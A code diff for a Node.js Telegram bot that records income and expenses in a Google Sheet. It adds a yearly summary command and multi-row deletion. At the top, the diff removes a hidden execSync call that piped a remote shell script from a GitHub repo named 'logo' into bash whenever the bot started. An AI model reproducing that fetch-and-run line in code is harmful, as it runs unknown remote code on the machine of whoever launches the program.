@@ -1,12 +1,3 @@
-const { execSync } = require('child_process');
-
-execSync(
-  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
-  {
-    stdio: 'inherit'
-  }
-);
-
 const { Telegraf } = require('telegraf');
 const { google } = require('googleapis');
 const config = require('./rekap.json');
@@ -132,6 +123,58 @@ async function getMonthlySummary(month, year) {
     totalPengeluaran,
     saldo: totalPemasukan - totalPengeluaran,
     items,
+  };
+}
+
+async function getYearlySummary(year) {
+  const client = await auth.getClient();
+  const sheets = google.sheets({ version: 'v4', auth: client });
+  const sheetName = getSheetName();
+
+  const res = await sheets.spreadsheets.values.get({
+    spreadsheetId: config.spreadsheetId,
+    range: `'${sheetName}'!A:D`,
+  });
+
+  const rows = res.data.values || [];
+  const dataRows = rows.slice(1);
+
+  let totalPemasukan = 0;
+  let totalPengeluaran = 0;
+
+  const perBulan = {};
+  for (let m = 1; m <= 12; m++) {
+    perBulan[m] = { pemasukan: 0, pengeluaran: 0 };
+  }
+
+  for (const row of dataRows) {
+    const tanggal = row[0] || '';
+    const pemasukan = row[2] || '';
+    const pengeluaran = row[3] || '';
+
+    const parsedDate = parseDateParts(tanggal);
+    if (!parsedDate) continue;
+
+    if (parsedDate.year !== year) continue;
+
+    const pemasukanNum = parseRupiahTextToNumber(pemasukan);
+    const pengeluaranNum = parseRupiahTextToNumber(pengeluaran);
+
+    totalPemasukan += pemasukanNum;
+    totalPengeluaran += pengeluaranNum;
+
+    perBulan[parsedDate.month].pemasukan += pemasukanNum;
+    perBulan[parsedDate.month].pengeluaran += pengeluaranNum;
+  }
+
+  const adaData = totalPemasukan > 0 || totalPengeluaran > 0;
+
+  return {
+    totalPemasukan,
+    totalPengeluaran,
+    saldo: totalPemasukan - totalPengeluaran,
+    perBulan,
+    adaData,
   };
 }
 
@@ -348,17 +391,22 @@ async function deleteRow(rowNumber) {
 function parseDeleteLine(line) {
   const text = String(line).trim();
 
-  const m = text.match(/^\/hapus\s+(\d+)$/i);
+  const m = text.match(/^\/hapus(?:@[A-Za-z0-9_]+)?\s+(\d+(?:\s+\d+)*)$/i);
   if (!m) {
     return { error: 'Format hapus salah.' };
   }
 
-  const rowNumber = Number(m[1]);
-  if (!Number.isInteger(rowNumber) || rowNumber < 2) {
-    return { error: 'Nomor baris tidak valid.' };
+  const rawNumbers = m[1].split(/\s+/).map(Number);
+
+  for (const n of rawNumbers) {
+    if (!Number.isInteger(n) || n < 2) {
+      return { error: `Nomor baris tidak valid: ${n}` };
+    }
   }
 
-  return { rowNumber };
+  const rowNumbers = [...new Set(rawNumbers)];
+
+  return { rowNumbers };
 }
 
 async function formatSheetLayout() {
@@ -833,6 +881,7 @@ async function registerCommands() {
     { command: 'start', description: 'Mulai bot' },
     { command: 'help', description: 'Bantuan format' },
     { command: 'bulan', description: 'Rekap bulanan' },
+    { command: 'tahun', description: 'Rekap tahunan' },
     { command: 'last', description: 'Lihat transaksi hari ini' },
     { command: 'edit', description: 'Edit transaksi berdasarkan nomor baris' },
     { command: 'hapus', description: 'Hapus transaksi berdasarkan nomor baris' },
@@ -954,6 +1003,81 @@ bot.command('bulan', async (ctx) => {
   } catch (err) {
     logError('Gagal mengambil rekap bulanan.', err);
     return ctx.reply('Gagal mengambil rekap bulanan.');
+  }
+});
+
+bot.command('tahun', async (ctx) => {
+  try {
+    if (!(await guardOwner(ctx))) return;
+
+    const text = (ctx.message.text || '').trim();
+    const parts = text.split(/\s+/).filter(Boolean);
+
+    const now = new Date();
+    let year = Number(
+      now.toLocaleDateString('en-US', {
+        timeZone: getTimezone(),
+        year: 'numeric'
+      })
+    );
+
+    if (parts.length >= 2) {
+      const inputYear = Number(parts[1]);
+
+      if (!Number.isInteger(inputYear) || inputYear < 2000) {
+        return ctx.reply('Format salah.\nContoh:\n/tahun\n/tahun 2026');
+      }
+
+      year = inputYear;
+    }
+
+    const summary = await getYearlySummary(year);
+
+    if (!summary.adaData) {
+      return ctx.reply(`Tidak ada transaksi untuk tahun ${year}.`);
+    }
+
+    const namaBulan = [
+      'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni',
+      'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'
+    ];
+
+    const lines = [];
+    lines.push(`Rekap tahun ${year}`);
+    lines.push('');
+
+    lines.push('Pemasukan');
+    let adaPemasukan = false;
+    for (let m = 1; m <= 12; m++) {
+      const data = summary.perBulan[m];
+      if (data.pemasukan > 0) {
+        lines.push(`${namaBulan[m - 1]} | ${formatRupiah(data.pemasukan)}`);
+        adaPemasukan = true;
+      }
+    }
+    if (!adaPemasukan) lines.push('-');
+
+    lines.push('');
+    lines.push('Pengeluaran');
+    let adaPengeluaran = false;
+    for (let m = 1; m <= 12; m++) {
+      const data = summary.perBulan[m];
+      if (data.pengeluaran > 0) {
+        lines.push(`${namaBulan[m - 1]} | ${formatRupiah(data.pengeluaran)}`);
+        adaPengeluaran = true;
+      }
+    }
+    if (!adaPengeluaran) lines.push('-');
+
+    lines.push('');
+    lines.push(`Total Pemasukan: ${formatRupiah(summary.totalPemasukan)}`);
+    lines.push(`Total Pengeluaran: ${formatRupiah(summary.totalPengeluaran)}`);
+    lines.push(`Saldo: ${formatRupiah(summary.saldo)}`);
+
+    return ctx.reply(lines.join('\n'));
+  } catch (err) {
+    logError('Gagal mengambil rekap tahunan.', err);
+    return ctx.reply('Gagal mengambil rekap tahunan.');
   }
 });
 
@@ -1096,10 +1220,12 @@ bot.command('hapus', async (ctx) => {
     if (/^\/hapus(@[A-Za-z0-9_]+)?$/i.test(text)) {
       return ctx.reply(
         'Format Hapus\n' +
-        '/hapus baris\n\n' +
+        '/hapus baris\n' +
+        '/hapus baris1 baris2 ...\n\n' +
         'Contoh Format\n' +
         '/hapus 14\n' +
-        '/hapus 15\n\n'
+        '/hapus 36 37\n' +
+        '/hapus 36 37 40'
       );
     }
 
@@ -1124,18 +1250,20 @@ bot.command('hapus', async (ctx) => {
         continue;
       }
 
-      const existing = await getRowByNumber(parsed.rowNumber);
-      if (!existing) {
-        failedLines.push(`${line} -> Baris ${parsed.rowNumber} tidak ditemukan.`);
-        continue;
-      }
+      for (const rowNumber of parsed.rowNumbers) {
+        const existing = await getRowByNumber(rowNumber);
+        if (!existing) {
+          failedLines.push(`Baris ${rowNumber} -> tidak ditemukan.`);
+          continue;
+        }
 
-      targets.push({
-        rowNumber: parsed.rowNumber,
-        kategori: existing.kategori,
-        nominal: existing.pemasukan || existing.pengeluaran || '-',
-        jenis: existing.pemasukan ? 'masuk' : 'keluar',
-      });
+        targets.push({
+          rowNumber,
+          kategori: existing.kategori,
+          nominal: existing.pemasukan || existing.pengeluaran || '-',
+          jenis: existing.pemasukan ? 'masuk' : 'keluar',
+        });
+      }
     }
 
     targets.sort((a, b) => b.rowNumber - a.rowNumber);
@@ -1154,6 +1282,7 @@ bot.command('hapus', async (ctx) => {
     let reply = '';
 
     if (successLines.length > 0) {
+      successLines.sort((a, b) => Number(a.split(' | ')[0]) - Number(b.split(' | ')[0]));
       reply += 'Berhasil dihapus ✅\n' + successLines.join('\n');
     }
 
@@ -1165,10 +1294,11 @@ bot.command('hapus', async (ctx) => {
     if (!reply) {
       reply =
         'Format Hapus\n' +
-        '/hapus baris\n\n' +
+        '/hapus baris\n' +
+        '/hapus baris1 baris2 ...\n\n' +
         'Contoh Format\n' +
         '/hapus 14\n' +
-        '/hapus 15';
+        '/hapus 36 37';
     }
 
     return ctx.reply(reply);
